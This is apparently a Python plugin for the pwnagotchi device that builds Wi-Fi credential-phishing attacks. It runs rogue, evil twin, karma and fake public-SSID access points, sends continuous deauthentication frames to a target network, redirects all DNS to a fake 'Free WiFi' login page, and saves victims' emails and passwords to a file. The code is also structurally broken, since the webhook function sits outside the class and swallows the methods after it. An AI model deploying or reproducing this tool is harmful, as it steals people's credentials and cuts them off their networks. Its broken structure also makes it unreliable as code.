import os
import re
import time
import signal
import threading
import logging
import subprocess
import json
import random
from pwnagotchi.ui.components import LabeledValue
from pwnagotchi.ui.view import BLACK
import pwnagotchi.ui.fonts as fonts
import pwnagotchi.plugins as plugins
from scapy.all import *

class CaPortal(plugins.Plugin):
    __author__ = 'avipars'
    __version__ = '0.0.0.2'
    __license__ = 'GPL3'
    __description__ = 'A plugin that creates evil captive portals.'
    __github__ = 'https://github.com/avipars'
    __name__ = "CaPortal"
    __defaults__ = {
        "enabled": False,
    }
    __dependencies__ = {
        "apt": [ "hostapd", "dnsmasq", "apache2", "php", "libapache2-mod-php"],
        "pip": ["scapy"],
    }
    # inspired by https://github.com/hacefresko/CaPortal/blob/master/raspberry_run.py
    def __init__(self):
        self.running = False
        self.interfaces = []
        self.interface = None
        self.monitor_interface = None
        self.target_ap = None
        self.dnsmasq_running = False
        self.hostapd_running = False
        self.deauth_running = False
        self.deauth_thread = None
        self.temp_folder = '/tmp/CaPortal'
        self.hostapd_conf = os.path.join(self.temp_folder, 'hostapd.conf')
        self.dnsmasq_conf = os.path.join(self.temp_folder, 'dnsmasq.conf')
        self.hostapd_log = os.path.join(self.temp_folder, 'hostapd.log')
        self.dnsmasq_log = os.path.join(self.temp_folder, 'dnsmasq.log')
        self.web_folder = '/var/www/html'
        self.captive_folder = os.path.join(self.web_folder, 'captive')

    def on_loaded(self):
        logging.info("[caportal] plugin loaded")
        try:
            # Create temp folder if not exists
            if not os.path.exists(self.temp_folder):
                os.makedirs(self.temp_folder)
            
            # Check for web root folder
            if not os.path.exists(self.web_folder):
                os.makedirs(self.web_folder)

        except Exception as e:
            logging.error(f"[caportal] error {str(e)}")

    def on_ui_setup(self, ui):
        with ui._lock:
            # Add a small indicator to the UI
            ui.add_element('caportal', LabeledValue(color=BLACK, label='', value='', position=(0, 95), label_font=fonts.Bold, text_font=fonts.Medium))

    def on_ui_update(self, ui):
        if self.running:
            ui.set('caportal', "EP:ON")
        else:
            ui.set('caportal', "EP:OFF")

def on_webhook(self, path, request):
    if not path or path == "/":
        # Return a full HTML page with buttons instead of just text
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Portal Plugin</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    max-width: 800px;
                    margin: 0 auto;
                    padding: 20px;
                }
                h1 {
                    color: #333;
                }
                .button-row {
                    margin: 20px 0;
                }
                button {
                    background-color: #4CAF50;
                    border: none;
                    color: white;
                    padding: 10px 20px;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 16px;
                    margin: 4px 2px;
                    cursor: pointer;
                    border-radius: 4px;
                }
                button.stop {
                    background-color: #f44336;
                }
                button.status {
                    background-color: #2196F3;
                }
                .mode-select {
                    margin: 20px 0;
                }
                select {
                    padding: 8px;
                    font-size: 16px;
                }
                #status-display {
                    background-color: #f1f1f1;
                    padding: 15px;
                    border-radius: 4px;
                    margin-top: 20px;
                    white-space: pre-wrap;
                }
            </style>
        </head>
        <body>
            <h1>Portal Plugin Control Panel</h1>
            
            <div class="mode-select">
                <label for="mode">Select Mode:</label>
                <select id="mode">
                    <option value="rogue">Rogue</option>
                    <option value="captive">Captive</option>
                    <option value="evil_twin">Evil Twin</option>
                </select>
            </div>
            
            <div class="button-row">
                <button onclick="startPortal()">Start Portal</button>
                <button class="stop" onclick="stopPortal()">Stop Portal</button>
                <button class="status" onclick="checkStatus()">Check Status</button>
            </div>
            
            <div id="status-display">Status: Idle</div>
            
            <script>
                function startPortal() {
                    const mode = document.getElementById('mode').value;
                    fetch(`/start?mode=${mode}`)
                        .then(response => response.text())
                        .then(data => {
                            document.getElementById('status-display').textContent = data;
                        });
                }
                
                function stopPortal() {
                    fetch('/stop')
                        .then(response => response.text())
                        .then(data => {
                            document.getElementById('status-display').textContent = data;
                        });
                }
                
                function checkStatus() {
                    fetch('/status')
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('status-display').textContent = JSON.stringify(data, null, 2);
                        });
                }
                
                // Check status on page load
                checkStatus();
            </script>
        </body>
        </html>
        """
        return html

    if path == "/start":
        if self.running:
            return "Portal is already running"
            
        mode = request.args.get("mode", "rogue")
        try:
            self.start_portal(mode)
            return "Portal started in {} mode".format(mode)
        except Exception as e:
            return "Error starting portal: {}".format(str(e))
            
    elif path == "/stop":
        if not self.running:
            return "Portal is not running"
            
        self.stop_portal()
        return "Portal stopped"
            
    elif path == "/status":
        status = {
            "running": self.running,
            "hostapd": self.hostapd_running,
            "dnsmasq": self.dnsmasq_running,
            "deauth": self.deauth_running,
            "interface": self.interface,
            "monitor_interface": self.monitor_interface,
            "target_ap": self.target_ap
        }
        return json.dumps(status)
            
    return f"Unknown command for path {path}"

    def on_unload(self, ui):
        self.stop_portal()
        with ui._lock:
            ui.remove_element('caportal')

    def on_internet_available(self, agent):
        pass

    def start_portal(self, mode="rogue"):
        if self.running:
            logging.warning("[caportal] Portal is already running")
            return
        
        self.running = True
        self.find_interfaces()
        
        if len(self.interfaces) < 1:
            logging.error("[caportal] No wireless interfaces found")
            self.running = False
            return
        
        self.interface = self.interfaces[0]
        logging.info(f"[caportal] Using interface {self.interface}")
        
        # Configure web files
        self.configure_web_app()
        
        if mode == "rogue":
            self._start_rogue_ap()
        elif mode == "evil_twin":
            self._start_evil_twin()
        elif mode == "karma":
            self._start_karma()
        elif mode == "known_beacons":
            self._start_known_beacons()
        else:
            logging.error(f"[caportal] Unknown mode: {mode}")
            self.running = False
            return
        
        # Start log monitor
        threading.Thread(target=self._monitor_logs, daemon=True).start()

    def stop_portal(self):
        if not self.running:
            return
            
        logging.info("[caportal] Stopping Portal")
        
        # Stop deauth
        if self.deauth_running and self.deauth_thread:
            self.deauth_running = False
            self.deauth_thread.stop = True
            logging.info("[caportal] Stopped deauth attack")
        
        # Stop hostapd
        if self.hostapd_running:
            os.system('pkill hostapd')
            self.hostapd_running = False
            logging.info("[caportal] Stopped hostapd")
        
        # Stop dnsmasq
        if self.dnsmasq_running:
            os.system('pkill dnsmasq')
            self.dnsmasq_running = False
            logging.info("[caportal] Stopped dnsmasq")
        
        # Reset interfaces
        if self.interface:
            os.system(f'ifconfig {self.interface} down')
            os.system(f'ifconfig {self.interface} up')
        
        self.running = False

    def _start_rogue_ap(self):
        """Start a rogue access point"""
        ssid = "Free-WiFi"
        channel = "1"
        encryption = "OPN"  # Open network
        
        self._setup_interface_for_ap(self.interface)
        
        if self._start_hostapd(ssid, channel, encryption) and self._start_dnsmasq():
            logging.info(f"[caportal] Rogue AP '{ssid}' started on channel {channel}")
        else:
            self.running = False

    def _start_evil_twin(self):
        """Start an evil twin attack (requires scanning)"""
        if len(self.interfaces) < 2:
            logging.error("[caportal] Evil Twin attack requires at least 2 wireless interfaces")
            self.running = False
            return
            
        self.monitor_interface = self.interfaces[1]
        self._put_interface_in_monitor(self.monitor_interface)
        
        # Scan for access points
        logging.info("[caportal] Scanning for access points...")
        access_points = self._scan_for_aps()
        
        if not access_points:
            logging.error("[caportal] No access points found")
            self.running = False
            return
            
        # Choose an AP with clients preferably
        target_ap = None
        for ap in access_points:
            if 'client' in ap:
                target_ap = ap
                break
        
        if not target_ap:
            target_ap = access_points[0]
            
        self.target_ap = target_ap
        
        # Configure main interface for AP mode
        self._setup_interface_for_ap(self.interface)
        
        # Start AP
        if self._start_hostapd(target_ap['ssid'], target_ap['channel'], target_ap['encryption']) and self._start_dnsmasq():
            logging.info(f"[caportal] Evil Twin '{target_ap['ssid']}' started on channel {target_ap['channel']}")
            
            # Start deauth attack
            if 'bssid' in target_ap:
                self._start_deauth(target_ap['channel'], target_ap['bssid'])
        else:
            self.running = False

    def _start_karma(self):
        """Start a Karma attack (respond to probe requests)"""
        self._put_interface_in_monitor(self.interface)
        
        # Sniff for probe requests
        logging.info("[caportal] Scanning for probe requests...")
        probe_req = self._scan_for_probe_requests()
        
        if not probe_req:
            logging.error("[caportal] No probe requests captured")
            self.running = False
            return
            
        # Set up interface for AP mode
        self._setup_interface_for_ap(self.interface)
        
        # Start AP with the probed SSID
        channel = "1"
        encryption = "OPN"  # Open network
        
        if self._start_hostapd(probe_req['ssid'], channel, encryption) and self._start_dnsmasq():
            logging.info(f"[caportal] Karma attack started for SSID '{probe_req['ssid']}' on channel {channel}")
        else:
            self.running = False

    def _start_known_beacons(self):
        """Start with known public WiFi SSIDs"""
        # Common public WiFis
        known_ssids = [
            "GoogleWiFi", 
            "Starbucks WiFi", 
            "Airport_Free_WiFi",
            "PublicWiFi",
            "McDonald's Free WiFi",
            "Guest WiFi",
        ]
        
        # Choose a random one
        ssid = random.choice(known_ssids)
        channel = "1"
        encryption = "OPN"  # Open network
        
        self._setup_interface_for_ap(self.interface)
        
        if self._start_hostapd(ssid, channel, encryption) and self._start_dnsmasq():
            logging.info(f"[caportal] Started AP with known SSID '{ssid}' on channel {channel}")
        else:
            self.running = False

    def _setup_interface_for_ap(self, interface):
        """Configure the interface for AP mode"""
        os.system(f'ifconfig {interface} down')
        os.system(f'iw {interface} set type managed')
        os.system(f'ifconfig {interface} up')
        os.system(f'ifconfig {interface} 10.0.0.1 netmask 255.255.255.0')
        return True

    def _put_interface_in_monitor(self, interface):
        """Put interface in monitor mode"""
        os.system(f'ifconfig {interface} down')
        os.system(f'iw {interface} set type monitor')
        os.system(f'ifconfig {interface} up')
        os.system(f'iw {interface} set channel 1')
        return True

    def _scan_for_aps(self, timeout=30):
        """Scan for access points"""
        access_points = []
        
        def change_channel():
            ch = 1
            interface = self.monitor_interface
            
            while ch <= 11:
                os.system(f'iw {interface} set channel {ch}')
                ch = ch + 1 if ch < 11 else 1
                time.sleep(0.5)
        
        # Start channel hopper
        channel_thread = threading.Thread(target=change_channel)
        channel_thread.daemon = True
        channel_thread.start()
        
        def ap_callback(pkt):
            if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
                bssid = pkt[Dot11].addr2.upper()
                try:
                    ssid = pkt.info.decode('utf-8')
                except:
                    ssid = "UNKNOWN"
                
                # Get encryption type
                crypto = "OPN"
                if pkt.haslayer(Dot11Beacon):
                    net_stats = pkt[Dot11Beacon].network_stats()
                    if net_stats.get('crypto'):
                        crypto_type = list(net_stats.get('crypto'))[0] if net_stats.get('crypto') else "OPN"
                        if crypto_type == "WPA2/PSK":
                            crypto = "WPA2/PSK"
                        elif crypto_type == "WPA/PSK":
                            crypto = "WPA/PSK"
                        else:
                            crypto = "OPN"
                
                # Get channel
                channel = "1"
                if pkt.haslayer(Dot11Beacon):
                    if net_stats.get('channel'):
                        channel = str(net_stats.get('channel'))
                
                new_ap = {
                    'bssid': bssid,
                    'ssid': ssid,
                    'channel': channel,
                    'encryption': crypto
                }
                
                if ssid and new_ap not in access_points:
                    access_points.append(new_ap)
                    logging.debug(f"[caportal] Found AP: {ssid} ({bssid}) - {crypto}")
        
        # Start sniffer
        sniff(iface=self.monitor_interface, prn=ap_callback, timeout=timeout)
        
        # Also check for clients
        def client_callback(pkt):
            if pkt.haslayer(Dot11) and pkt.type == 2:  # Data frames
                bssid = pkt[Dot11].addr1.upper()
                client = pkt[Dot11].addr2.upper()
                
                for ap in access_points:
                    if ap['bssid'] == bssid:
                        ap['client'] = client
                        logging.debug(f"[caportal] Found client {client} for AP {ap['ssid']}")
        
        # Quick scan for clients
        sniff(iface=self.monitor_interface, prn=client_callback, timeout=10)
        
        return access_points

    def _scan_for_probe_requests(self, timeout=30):
        """Scan for probe requests"""
        probe_requests = []
        
        def change_channel():
            ch = 1
            interface = self.interface
            
            while ch <= 11:
                os.system(f'iw {interface} set channel {ch}')
                ch = ch + 1 if ch < 11 else 1
                time.sleep(0.5)
        
        # Start channel hopper
        channel_thread = threading.Thread(target=change_channel)
        channel_thread.daemon = True
        channel_thread.start()
        
        def probe_callback(pkt):
            if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 4:  # Probe request
                client = pkt[Dot11].addr2.upper()
                try:
                    ssid = pkt.info.decode('utf-8')
                except:
                    ssid = ""
                
                if ssid:  # Only capture non-empty probe requests
                    new_probe = {'client': client, 'ssid': ssid}
                    if new_probe not in probe_requests:
                        probe_requests.append(new_probe)
                        logging.debug(f"[caportal] Probe request from {client} for {ssid}")
        
        # Start sniffer
        sniff(iface=self.interface, prn=probe_callback, timeout=timeout)
        
        # Return the most common probe request
        if probe_requests:
            # Sort by occurrence count
            ssid_counts = {}
            for probe in probe_requests:
                if probe['ssid'] not in ssid_counts:
                    ssid_counts[probe['ssid']] = 0
                ssid_counts[probe['ssid']] += 1
            
            # Get the most common SSID
            most_common_ssid = max(ssid_counts, key=ssid_counts.get)
            for probe in probe_requests:
                if probe['ssid'] == most_common_ssid:
                    return probe
        
        return None

    def _start_hostapd(self, ssid, channel, encryption):
        """Configure and start hostapd"""
        # Create hostapd config
        hostapd_config = f"""interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
"""

        # Add encryption if needed
        if encryption == "WPA/PSK":
            password = "Password123"  # Default password for WPA
            hostapd_config += f"""wpa=1
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
auth_algs=3
"""
        elif encryption == "WPA2/PSK":
            password = "Password123"  # Default password for WPA2
            hostapd_config += f"""wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
auth_algs=3
"""

        # Write config to file
        with open(self.hostapd_conf, 'w') as f:
            f.write(hostapd_config)
        
        # Start hostapd
        cmd = f"hostapd {self.hostapd_conf} > {self.hostapd_log} 2>&1 &"
        ret = os.system(cmd)
        
        if ret == 0:
            self.hostapd_running = True
            logging.info(f"[caportal] hostapd started with SSID {ssid}")
            return True
        else:
            logging.error("[caportal] Failed to start hostapd")
            return False

    def _start_dnsmasq(self):
        """Configure and start dnsmasq"""
        # Stop any running dnsmasq
        os.system('service dnsmasq stop')
        os.system('pkill dnsmasq')
        
        # Clear iptables rules
        os.system('iptables -F')
        os.system('iptables -t nat -F')
        
        # Create dnsmasq config
        dnsmasq_config = f"""interface={self.interface}
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
log-queries
address=/#/10.0.0.1
address=/www.google.com/216.58.209.68
"""

        # Write config to file
        with open(self.dnsmasq_conf, 'w') as f:
            f.write(dnsmasq_config)
        
        # Create hosts file
        with open(os.path.join(self.temp_folder, 'hosts'), 'w') as f:
            f.write('10.0.0.1 wifiportal.evil')
        
        # Start dnsmasq
        cmd = f"dnsmasq -C {self.dnsmasq_conf} -H {os.path.join(self.temp_folder, 'hosts')} --log-facility={self.dnsmasq_log}"
        ret = os.system(cmd)
        
        if ret == 0:
            self.dnsmasq_running = True
            logging.info("[caportal] dnsmasq started")
            return True
        else:
            logging.error("[caportal] Failed to start dnsmasq")
            return False

    def _start_deauth(self, channel, bssid):
        """Start deauthentication attack on a target AP"""
        if not self.monitor_interface:
            logging.error("[caportal] No monitor interface available for deauth")
            return False
        
        # Set channel
        os.system(f'iw {self.monitor_interface} set channel {channel}')
        
        def send_deauth():
            # Create deauth packet
            broadcast = 'FF:FF:FF:FF:FF:FF'
            pkt = RadioTap()/Dot11(addr1=broadcast, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=1)
            
            t = threading.currentThread()
            while not getattr(t, 'stop', False):
                sendp(pkt, iface=self.monitor_interface, verbose=0)
                time.sleep(0.1)
        
        # Start deauth thread
        self.deauth_thread = threading.Thread(target=send_deauth)
        self.deauth_thread.daemon = True
        self.deauth_thread.start()
        self.deauth_running = True
        
        logging.info(f"[caportal] Deauth attack started on {bssid}")
        return True

    def _monitor_logs(self):
        """Monitor hostapd and dnsmasq logs"""
        last_check = time.time()
        
        while self.running:
            time.sleep(5)
            
            # Check for new connections
            try:
                if os.path.exists(self.hostapd_log):
                    with open(self.hostapd_log, 'r') as f:
                        log_content = f.read()
                        if "AP-STA-CONNECTED" in log_content:
                            logging.info("[caportal] New client connected to the evil portal!")
                
                if os.path.exists(self.dnsmasq_log):
                    with open(self.dnsmasq_log, 'r') as f:
                        log_content = f.read()
                        if "DHCPACK" in log_content and time.time() - last_check > 10:
                            logging.info("[caportal] New DHCP lease assigned!")
                            last_check = time.time()
            except:
                pass

    def configure_web_app(self):
        """Configure the captive portal web files"""
        # Create captive portal directory if it doesn't exist
        if not os.path.exists(self.captive_folder):
            os.makedirs(self.captive_folder)
        
        # Simple HTML for captive portal
        index_html = """<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            color: #333;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        input[type=text], input[type=password], input[type=email] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            display: inline-block;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            background-color: #4CAF50;
            color: white;
            padding: 14px;
            margin: 8px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .terms {
            font-size: 12px;
            color: #666;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h2>Free WiFi</h2>
        </div>
        <h1>Connect to WiFi</h1>
        <p>Please login to access the internet:</p>
        <form action="login.php" method="post">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
        <div class="terms">
            By connecting, you agree to our Terms of Service and Privacy Policy.
        </div>
    </div>
</body>
</html>
"""

        login_php = """<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    // Log credentials
    $file = fopen("creds.txt", "a");
    fwrite($file, "Email: " . $email . " - Password: " . $password . " - Date: " . date("Y-m-d H:i:s") . "\\n");
    fclose($file);
    
    // Redirect to success page
    header("Location: success.html");
    exit();
}
?>
"""

        success_html = """<!DOCTYPE html>
<html>
<head>
    <title>Connected</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            text-align: center;
        }
        h1 {
            color: #4CAF50;
        }
        .icon {
            font-size: 50px;
            color: #4CAF50;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">✓</div>
        <h1>Connected!</h1>
        <p>You are now connected to the WiFi network.</p>
        <p>Please wait while we redirect you...</p>
    </div>
</body>
</html>
"""

        htaccess = """<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{HTTP_HOST} !^wifiportal\.evil
RewriteRule ^(.*)$ http://wifiportal.evil/captive/ [R=302,L]
</IfModule>
"""
        # Write files
        with open(os.path.join(self.captive_folder, 'index.html'), 'w') as f:
            f.write(index_html)
        
        with open(os.path.join(self.captive_folder, 'login.php'), 'w') as f:
            f.write(login_php)
        
        with open(os.path.join(self.captive_folder, 'success.html'), 'w') as f:
            f.write(success_html)
        
        with open(os.path.join(self.web_folder, '.htaccess'), 'w') as f:
            f.write(htaccess)
        
        # Set permissions
        os.system(f'chmod -R 755 {self.web_folder}')
        
        # Configure Apache for PHP and mod_rewrite
        apache_conf = """<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>
"""
        with open('/etc/apache2/conf-available/override.conf', 'w') as f:
            f.write(apache_conf)
        
        # Enable modules and restart services
        os.system('a2enconf override')
        os.system('a2enmod rewrite')
        os.system('a2enmod php7.3 || a2enmod php7.4 || a2enmod php7.2')  # Try different PHP versions
        os.system('service apache2 restart')
        os.system('service mysql start')  # Start MySQL if needed
        
        logging.info("[caportal] Web application configured")
        return True

    def find_interfaces(self):
        """Find available wireless interfaces"""
        self.interfaces = []
        
        # Look for wireless interfaces
        try:
            output = subprocess.check_output(['iwconfig'], stderr=subprocess.STDOUT).decode('utf-8')
            interfaces = re.findall(r'(\w+)(?:\s+)IEEE', output)
            
            # Exclude the main pwnagotchi interface if it's in monitor mode
            for interface in interfaces:
                self.interfaces.append(interface)
                
            logging.info(f"[caportal] Found interfaces: {', '.join(self.interfaces)}")
        except:
            logging.error("[caportal] Failed to find wireless interfaces")
        
        return self.interfaces